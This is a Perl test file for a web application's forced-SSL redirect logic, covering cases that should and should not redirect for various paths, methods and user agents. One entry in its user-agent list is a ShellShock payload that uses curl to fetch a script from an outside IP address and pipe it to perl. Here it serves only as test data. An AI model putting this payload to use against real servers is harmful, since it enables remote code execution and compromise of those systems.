#!/usr/bin/perl -w
#
#  Tests for SSL redirection
#
#  We don't actually test SSL, but the decision whether to redirect or not
#  is complex enough to warrant a test.
#

use strict;
use c2systest;
use c2cgitest;

# Positive case: regular
# A: invoke regular script (home page)
# E: must redirect
test 'web/38_ssl/pos1', sub {
    my $setup = shift;
    test_redirect($setup, 'index.cgi', undef, 'https://pcc.com/');
};

# Positive case: path parameter
# A: invoke regular script with path parameter
# E: must redirect, preserving the path
test 'web/38_ssl/pos2', sub {
    my $setup = shift;
    test_redirect($setup, 'talk/thread.cgi', '/42-your-title-here', 'https://pcc.com/talk/thread.cgi/42-your-title-here');
};

# Positive case: path parameter
# A: invoke an 'index.cgi' script with path parameter
# E: must redirect, preserving the path, including the 'index.cgi' token
test 'web/38_ssl/pos3', sub {
    my $setup = shift;
    test_redirect($setup, 'talk/index.cgi', '/active', 'https://pcc.com/talk/index.cgi/active');
};

# Positive case: omitting optional path parameter
# A: invoke script that accepts a path parameter
# E: must redirect
# FIXME: this should preserve the trailing slash (this script is instantiated with selfPath
# starting with a slash). This is probably a bug in c2web.pm's path processing.
test 'web/38_ssl/pos4', sub {
    my $setup = shift;
    test_redirect($setup, 'talk/index.cgi', undef, 'https://pcc.com/talk');
};

# Negative case: POST.
# A: send a POST.
# E: no redirect, return regular content.
test 'web/38_ssl/neg1', sub {
    my $setup = shift;
    setup_add_service_config($setup, 'WWW.ForceSSL', 1);
    setup_start($setup);

    # Run the CGI
    my $cgi = cgi_new($setup, 'index.cgi');
    cgi_set_post_params($cgi, 'a', 'b');
    my $result = cgi_run($cgi);

    assert_starts_with $result->{headers}{'status'}, '200';
};

# Negative case: GET parameters.
# A: send request with parameters.
# E: no redirect, return regular content.
test 'web/38_ssl/neg2', sub {
    my $setup = shift;
    setup_add_service_config($setup, 'WWW.ForceSSL', 1);
    setup_start($setup);

    # Run the CGI
    my $cgi = cgi_new($setup, 'index.cgi');
    cgi_set_get_params($cgi, 'a', 'b');
    my $result = cgi_run($cgi);

    assert_starts_with $result->{headers}{'status'}, '200';
};

# Negative case: already on SSL.
# A: send request that claims to be on SSL already.
# E: no redirect, return regular content.
test 'web/38_ssl/neg3', sub {
    my $setup = shift;
    setup_add_service_config($setup, 'WWW.ForceSSL', 1);
    setup_start($setup);

    # Run the CGI
    my $cgi = cgi_new($setup, 'index.cgi');
    $cgi->{env}{HTTPS} = 'on';
    $cgi->{env}{SERVER_PORT} = '443';
    my $result = cgi_run($cgi);

    assert_starts_with $result->{headers}{'status'}, '200';
};

# Negative case: c2monitor
# A: send request User-Agent: c2monitor
# E: no redirect, return regular content.
test 'web/38_ssl/neg4', sub {
    my $setup = shift;
    setup_add_service_config($setup, 'WWW.ForceSSL', 1);
    setup_start($setup);

    # Run the CGI
    my $cgi = cgi_new($setup, 'index.cgi');
    $cgi->{env}{HTTP_USER_AGENT} = "c2monitor";
    my $result = cgi_run($cgi);

    assert_starts_with $result->{headers}{'status'}, '200';
};

# Positive case: user agents.
# A: send requests with known-good user-agent.
# E: none must trigger the c2monitor exception
test 'web/38_ssl/pos_ua', sub {
    my $setup = shift;
    setup_add_service_config($setup, 'WWW.ForceSSL', 1);
    setup_start($setup);

    # Subset of the user-agents from 15_ua
    my @UA = (
        '-',
        'Konqueror/20.12 (AmigaOS 4.7; be_BY;)',
        'Links (2.8; Linux 3.16.0-042stab134.3 x86_64; GNU C 4.9.1; text)',
        'Lynx/2.8.9dev.8 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.4.9',
        'Mozilla Firefox Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
        'Mozilla/4.05 (Macintosh; I; 68K Nav)',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
        'Opera/8.00 (Windows NT 5.1; U; en)',
        'Safari/13604.5.6 CFNetwork/893.13.1 Darwin/17.4.0 (x86_64)',
        'MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
        'Mobile/2.12 (Arch Linux 5.9; sq_AL;)',
        'MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0',
        'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 630 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
        'iCabMobile/9.3.3 CFNetwork/758.3.15 Darwin/15.4.0',
        '() { :; }; curl http://202.28.77.53/~prajaks/310482/index.png | perl',             # ShellShock
        'Googlebot-Image/1.0',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'ia_archiver',
    );
    foreach (@UA) {
        my $cgi = cgi_new($setup, 'index.cgi');
        $cgi->{env}{HTTP_USER_AGENT} = $_;
        my $result = cgi_run($cgi);

        assert_starts_with $result->{headers}{'status'}, '301';
        assert_equals      $result->{headers}{'location'}, 'https://pcc.com/';
    }
};



#
#  Positive Case Canned Test
#
sub test_redirect {
    my ($setup, $script, $path, $expect) = @_;

    # Start the empty setup
    setup_add_service_config($setup, 'WWW.ForceSSL', 1);
    setup_start($setup);

    # Run the CGI
    my $cgi = cgi_new($setup, $script);
    cgi_set_path($cgi, $path) if defined($path);
    my $result = cgi_run($cgi);

    # Must return a redirect
    assert_starts_with $result->{headers}{'status'},   '301';
    assert_equals      $result->{headers}{'location'}, $expect;
}
